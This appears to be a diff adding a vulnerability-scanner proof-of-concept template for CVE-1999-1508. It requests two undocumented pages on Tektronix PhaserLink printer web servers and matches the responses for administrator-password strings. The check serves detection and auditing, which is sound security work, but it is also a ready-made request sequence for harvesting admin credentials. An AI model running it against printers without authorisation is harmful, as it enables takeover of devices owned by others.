@@ -1,0 +1,72 @@
+[info]
+author = "ave"
+description = "Tektronix PhaserLink WebServer 存在未授权访问漏洞，攻击者可直接访问未公开的 ncl_items.html 和 ncl_subjects.html 页面获取管理员密码，从而完全控制打印机。"
+id = "POC-AVE-1999-1980"
+name = "CVE-1999-1508 PoC - Tektronix PhaserLink WebServer 管理员密码泄露"
+severity = "critical"
+tags = ["ave-1999-1980"]
+vuln_id = [
+    "CVE-1999-1508",
+    "AVE-1999-1980",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/ncl_items.html"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "password",
+    "PASSWORD",
+    "admin",
+    "ADMIN",
+    "administrator",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/ncl_subjects.html"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "password",
+    "PASSWORD",
+    "admin",
+    "ADMIN",
+    "administrator",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
